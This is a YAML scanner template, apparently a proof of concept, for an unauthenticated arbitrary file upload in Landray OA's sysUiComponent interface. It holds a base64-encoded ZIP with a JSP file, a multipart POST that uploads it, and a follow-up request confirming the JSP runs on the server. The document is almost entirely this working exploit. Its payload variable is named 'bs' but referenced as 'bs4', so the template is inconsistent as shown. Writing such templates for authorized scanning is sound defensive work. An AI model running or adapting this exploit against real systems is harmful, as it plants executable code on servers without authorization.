app: Landray
query: app:"Landray"
meta:
  name: 蓝凌OA sysUiComponent 任意文件上传漏洞
  level: 4
  tags:
  - file_upload
  description: 蓝凌OA sysUiComponent接口处存在任意文件上传漏洞，未经过身份认证的攻击者可通过构造压缩文件上传恶意后门文件，远程命令执行，获取服务器权限。
  homepage: ""
  author: X prism
  references: ""
  solution: 升级至最新版
  create_at: "2024-07-13 14:17:20"
  available: false
  steps:
    variable:
    - bs: base64StringDecode("UEsDBBQAAAAIADsbfVddhQ1dHQAAABsAAAANAAAAY29tcG9uZW50LmluactMsTUyMDLmykvMTbUtycxNLS5JzC0o1ssqLgAAUEsDBBQAAAAIADsbfVe0QKhCYAAAAGgAAAAOAAAAdGltZXN0YW1wcy5qc3AdyDEOgzAMBdCrsCDFHSyljFQdO1dwAqt8UVdWkgYD129hfO/WNnl1LlWTWwrxGuOl6yL1CXvzkU1YMz/UEKQU05e45sQzfIDYU/wdKr4rFj9uRN0MfjYR8YS/EKhv7z9QSwECFAMUAAAACAA7G31XXYUNXR0AAAAbAAAADQAAAAAAAAAAAAAAgAEAAAAAY29tcG9uZW50LmluaVBLAQIUAxQAAAAIADsbfVe0QKhCYAAAAGgAAAAOAAAAAAAAAAAAAACAAUgAAAB0aW1lc3RhbXBzLmpzcFBLBQYAAAAAAgACAHcAAADUAAAAAAA=")
    verify_steps:
      type: and
      verify:
      - request:
          method: POST
          path: /sys/ui/sys_ui_component/sysUiComponent.do?method=getThemeInfo&s_ajax=true
          redirect: true
          header:
          - ' Content-Type': multipart/form-data; boundary=---------------------------15610248407689
          params: |-
            -----------------------------15610248407689
            Content-Disposition: form-data; name="file"; filename="test.zip"
            Content-Type: application/x-zip-compressed

            {{bs4}}
            -----------------------------15610248407689--
        response:
        - name: code
          value: "200"
          type: equals
      - request:
          method: GET
          path: /resource/ui-component/2023/timestamps.jsp
          redirect: true
          header: []
          params: ""
        response:
        - name: code
          value: "200"
          type: equals
        - name: body
          value: "400841"
          type: contains
    exploit_steps:
      type: ""
      params:
        name: ""
        type: input
        value: ""
